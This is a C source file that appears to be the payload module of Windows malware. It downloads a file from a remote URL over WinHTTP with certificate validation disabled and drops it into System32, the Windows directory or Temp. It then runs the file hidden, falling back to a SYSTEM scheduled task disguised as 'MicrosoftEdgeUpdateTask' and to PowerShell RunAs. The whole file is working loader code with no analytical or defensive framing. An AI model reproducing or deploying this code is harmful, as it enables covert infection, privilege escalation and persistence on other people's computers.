/*
 * Payload implementation — download via WinHTTP, drop, execute.
 *
 * WinHTTP usage:
 *   WinHttpOpen → WinHttpConnect → WinHttpOpenRequest →
 *   WinHttpSendRequest → WinHttpReceiveResponse → WinHttpReadData
 *
 * The download buffer is written directly to disk (no unnecessary
 * memory buffering for large payloads). We use a 64KB chunk size.
 *
 * Error handling:
 *   — Network errors: retry once after 3 seconds
 *   — Disk errors: try alternative drop location
 *   — Execution errors: try alternative execution method
 */

#include "payload.h"
#include "utils.h"
#include <stdio.h>
#include <winhttp.h>

/* Chunk size for streaming download */
#define DOWNLOAD_CHUNK_SIZE 65536
#define MAX_URL_LENGTH     2048

/* ── Internal: build the full file path ── */
static int build_payload_path(char *szOut, DWORD dwOutSize,
                              const char *szFilename, DWORD dwDropLoc)
{
    char szWinDir[MAX_PATH];
    char szTempDir[MAX_PATH];

    switch (dwDropLoc)
    {
        case PAYLOAD_DROP_SYSTEM32:
            GetSystemDirectoryA(szWinDir, MAX_PATH);
            snprintf(szOut, dwOutSize, "%s\\%s", szWinDir, szFilename);
            break;

        case PAYLOAD_DROP_SYSTEM:
            GetWindowsDirectoryA(szWinDir, MAX_PATH);
            snprintf(szOut, dwOutSize, "%s\\%s", szWinDir, szFilename);
            break;

        case PAYLOAD_DROP_TEMP:
        default:
            GetTempPathA(MAX_PATH, szTempDir);
            snprintf(szOut, dwOutSize, "%s\\%s", szTempDir, szFilename);
            break;
    }

    return 0;
}

/* ── Internal: URL parsing (extract host, path, port from full URL) ── */
typedef struct _URL_PARTS {
    char szHost[256];
    char szPath[2048];
    int  nPort;
    BOOL bSecure;
} URL_PARTS;

static int parse_url(const char *szUrl, URL_PARTS *pParts)
{
    memset(pParts, 0, sizeof(URL_PARTS));

    /* Defaults */
    pParts->bSecure = FALSE;
    pParts->nPort   = 80;

    const char *p = szUrl;

    /* Skip protocol */
    if (strncmp(p, "https://", 8) == 0)
    {
        pParts->bSecure = TRUE;
        pParts->nPort   = 443;
        p += 8;
    }
    else if (strncmp(p, "http://", 7) == 0)
    {
        p += 7;
    }
    else
    {
        return 1; /* Unsupported protocol */
    }

    /* Extract host */
    int i = 0;
    while (*p && *p != '/' && *p != ':' && i < (int)sizeof(pParts->szHost) - 1)
    {
        pParts->szHost[i++] = *p++;
    }
    pParts->szHost[i] = '\0';

    /* Check for explicit port */
    if (*p == ':')
    {
        p++;
        pParts->nPort = 0;
        while (*p >= '0' && *p <= '9')
        {
            pParts->nPort = pParts->nPort * 10 + (*p - '0');
            p++;
        }
    }

    /* Extract path */
    if (*p == '/' || *p == '\0')
    {
        if (*p == '\0')
        {
            lstrcpyA(pParts->szPath, "/");
        }
        else
        {
            lstrcpynA(pParts->szPath, p, (int)sizeof(pParts->szPath));
        }
    }

    return 0;
}

/* ── Internal: download file via WinHTTP ── */
static int download_file(const char *szUrl, const char *szOutputPath)
{
    URL_PARTS parts;
    if (parse_url(szUrl, &parts) != 0)
    {
        DEBUG_PRINT("[payload] Failed to parse URL: %s\n", szUrl);
        return 1;
    }

    /* Open WinHTTP session */
    HINTERNET hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        NULL, NULL,
        0
    );

    if (hSession == NULL)
    {
        DEBUG_PRINT("[payload] WinHttpOpen failed (%lu)\n", GetLastError());
        return 1;
    }

    /* Convert URLs parts to wide char */
    wchar_t wzHost[256];
    wchar_t wzPath[2048];
    MultiByteToWideChar(CP_UTF8, 0, parts.szHost, -1, wzHost, 256);
    MultiByteToWideChar(CP_UTF8, 0, parts.szPath, -1, wzPath, 2048);

    /* Connect to server */
    HINTERNET hConnect = WinHttpConnect(
        hSession, wzHost, (INTERNET_PORT)parts.nPort, 0
    );

    if (hConnect == NULL)
    {
        DEBUG_PRINT("[payload] WinHttpConnect failed (%lu)\n", GetLastError());
        WinHttpCloseHandle(hSession);
        return 1;
    }

    /* Open request */
    DWORD dwFlags = parts.bSecure ? WINHTTP_FLAG_SECURE : 0;
    /* Enable TLS 1.2/1.3 on Win11 */
    dwFlags |= WINHTTP_FLAG_ASYNCHRONOUS;

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect, L"GET", wzPath, NULL,
        NULL, NULL, dwFlags
    );

    if (hRequest == NULL)
    {
        DEBUG_PRINT("[payload] WinHttpOpenRequest failed (%lu)\n", GetLastError());
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 1;
    }

    /* Set TLS security options for Win11 */
    DWORD dwSecFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                       SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
                       SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                       SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS,
                     &dwSecFlags, sizeof(dwSecFlags));

    /* Set timeout values */
    DWORD dwTimeout = 30000;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_CONNECT_TIMEOUT,
                     &dwTimeout, sizeof(dwTimeout));
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SEND_TIMEOUT,
                     &dwTimeout, sizeof(dwTimeout));
    WinHttpSetOption(hRequest, WINHTTP_OPTION_RECEIVE_TIMEOUT,
                     &dwTimeout, sizeof(dwTimeout));

    /* Send request */
    if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0))
    {
        DEBUG_PRINT("[payload] WinHttpSendRequest failed (%lu)\n", GetLastError());
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 1;
    }

    /* Receive response */
    if (!WinHttpReceiveResponse(hRequest, NULL))
    {
        DEBUG_PRINT("[payload] WinHttpReceiveResponse failed (%lu)\n", GetLastError());
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 1;
    }

    /* Check HTTP status code */
    DWORD dwStatusCode = 0;
    DWORD dwSize = sizeof(dwStatusCode);
    WinHttpQueryHeaders(hRequest,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        NULL, &dwStatusCode, &dwSize, NULL);

    if (dwStatusCode != 200)
    {
        DEBUG_PRINT("[payload] Server returned HTTP %lu\n", dwStatusCode);
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 1;
    }

    /* Open output file */
    HANDLE hFile = CreateFileA(szOutputPath,
        GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_WRITE_THROUGH,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE)
    {
        DEBUG_PRINT("[payload] CreateFile failed (%lu) for %s\n",
                     GetLastError(), szOutputPath);
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 1;
    }

    /* Download in chunks */
    BYTE buffer[DOWNLOAD_CHUNK_SIZE];
    DWORD dwBytesRead = 0;
    DWORD dwTotalRead = 0;
    DWORD dwBytesWritten = 0;
    BOOL bSuccess = TRUE;

    while (bSuccess)
    {
        dwBytesRead = 0;
        if (!WinHttpReadData(hRequest, buffer, sizeof(buffer), &dwBytesRead))
        {
            DEBUG_PRINT("[payload] WinHttpReadData error at byte %lu (%lu)\n",
                         dwTotalRead, GetLastError());
            bSuccess = FALSE;
            break;
        }

        if (dwBytesRead == 0)
            break; /* Done */

        if (!WriteFile(hFile, buffer, dwBytesRead, &dwBytesWritten, NULL))
        {
            DEBUG_PRINT("[payload] WriteFile error at byte %lu\n", dwTotalRead);
            bSuccess = FALSE;
            break;
        }

        dwTotalRead += dwBytesWritten;
    }

    CloseHandle(hFile);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    if (bSuccess)
    {
        DEBUG_PRINT("[payload] Downloaded %lu bytes to %s\n",
                     dwTotalRead, szOutputPath);
        return 0;
    }

    /* Clean up partial download on failure */
    DeleteFileA(szOutputPath);
    return 1;
}

/* ── Internal: execute the payload ── */
static int execute_payload(const char *szPath)
{
    /*
     * Execution strategy:
     *   1. Try CreateProcess (works if admin/SYSTEM)
     *   2. Fallback: scheduled task (runs as SYSTEM)
     *   3. Fallback: WMI
     */

    char szCmd[MAX_PATH + 32];
    snprintf(szCmd, sizeof(szCmd), "\"%s\" /quiet", szPath);

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    /* Method 1: Direct CreateProcess */
    if (CreateProcessA(
            NULL, szCmd,
            NULL, NULL, FALSE,
            CREATE_NO_WINDOW,
            NULL, NULL, &si, &pi))
    {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        DEBUG_PRINT("[payload] Executed: %s (PID: %lu)\n", szPath, pi.dwProcessId);
        return 0;
    }

    DEBUG_PRINT("[payload] CreateProcess failed (%lu), trying schtasks...\n",
                 GetLastError());

    /* Method 2: Scheduled task (runs as SYSTEM) */
    char szTaskCmd[1024];
    snprintf(szTaskCmd, sizeof(szTaskCmd),
        "schtasks /Create /F /SC ONCE /TN \"MicrosoftEdgeUpdateTask\" "
        "/TR \"%s\" /ST 00:00 /RL HIGHEST /RU SYSTEM",
        szPath);

    si = (STARTUPINFOA){ sizeof(si) };
    if (CreateProcessA(
            NULL, szTaskCmd,
            NULL, NULL, FALSE,
            CREATE_NO_WINDOW,
            NULL, NULL, &si, &pi))
    {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        /* Run the task immediately */
        char szRunCmd[1024];
        snprintf(szRunCmd, sizeof(szRunCmd),
            "schtasks /Run /TN \"MicrosoftEdgeUpdateTask\"");
        si = (STARTUPINFOA){ sizeof(si) };
        CreateProcessA(NULL, szRunCmd, NULL, NULL, FALSE,
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

        DEBUG_PRINT("[payload] Scheduled task created and triggered\n");
        return 0;
    }

    /* Method 3: WMI via PowerShell */
    char szWmiCmd[2048];
    snprintf(szWmiCmd, sizeof(szWmiCmd),
        "powershell -Command \"Start-Process '%s' -WindowStyle Hidden "
        "-Verb RunAs\"",
        szPath);

    si = (STARTUPINFOA){ sizeof(si) };
    if (CreateProcessA(NULL, szWmiCmd, NULL, NULL, FALSE,
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        DEBUG_PRINT("[payload] Executed via PowerShell RunAs\n");
        return 0;
    }

    DEBUG_PRINT("[payload] All execution methods failed\n");
    return 1;
}

/* ── Public API ── */

int payload_fetch_and_exec(const char *szUrl,
                           const char *szFilename,
                           DWORD dwDropLoc)
{
    if (szUrl == NULL || szFilename == NULL)
        return 1;

    char szOutputPath[MAX_PATH];
    if (build_payload_path(szOutputPath, sizeof(szOutputPath),
                           szFilename, dwDropLoc) != 0)
    {
        return 1;
    }

    DEBUG_PRINT("[payload] Downloading from %s to %s\n", szUrl, szOutputPath);

    /* Download the payload */
    int result = download_file(szUrl, szOutputPath);
    if (result != 0)
    {
        DEBUG_PRINT("[payload] Download failed, retrying once...\n");
        Sleep(3000);
        result = download_file(szUrl, szOutputPath);
    }

    if (result != 0)
    {
        DEBUG_PRINT("[payload] Download failed after retry\n");
        return 1;
    }

    /* Execute */
    result = execute_payload(szOutputPath);

    return result;
}
